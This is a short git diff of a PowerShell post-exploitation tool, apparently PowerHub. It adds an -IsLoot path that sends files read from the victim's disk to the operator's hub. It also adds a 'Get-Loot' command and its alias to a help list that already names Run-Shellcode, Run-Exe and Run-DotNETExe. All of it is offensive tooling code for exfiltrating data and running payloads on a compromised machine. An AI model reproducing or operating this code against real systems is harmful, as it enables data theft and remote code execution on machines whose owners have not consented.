@@ -518,7 +518,11 @@ Get-ChildItem | PushTo-Hub -Name "directory-listing"
                 $fileBin = [System.IO.File]::ReadAllBytes($abspath)
                 if ($Name) { $filename = $name } else { $filename = $file }
 
-                Send-File $fileBin $filename
+                if ($IsLoot) {
+                    Send-File -IsLoot $fileBin $filename
+                } else {
+                    Send-File $fileBin $filename
+                }
 
             }
         }
@@ -643,6 +647,7 @@ function Help-PowerHub {
 The following functions are available (some with short aliases):
   * List-HubModules (lshm)
   * Load-HubModule (lhm)
+  * Get-Loot (glo)
   * Run-Exe (re)
   * Run-DotNETExe (rdne)
   * Run-Shellcode (rsh)
@@ -657,6 +662,7 @@ Use 'Get-Help' to learn more about those functions.
 try { New-Alias -Name pth -Value PushTo-Hub } catch { }
 try { New-Alias -Name lhm -Value Load-HubModule } catch { }
 try { New-Alias -Name lshm -Value List-HubModules } catch { }
+try { New-Alias -Name glo -Value Get-Loot } catch { }
 try { New-Alias -Name re -Value Run-Exe } catch { }
 try { New-Alias -Name rdne -Value Run-DotNETExe } catch { }
 try { New-Alias -Name rsh -Value Run-Shellcode } catch { }
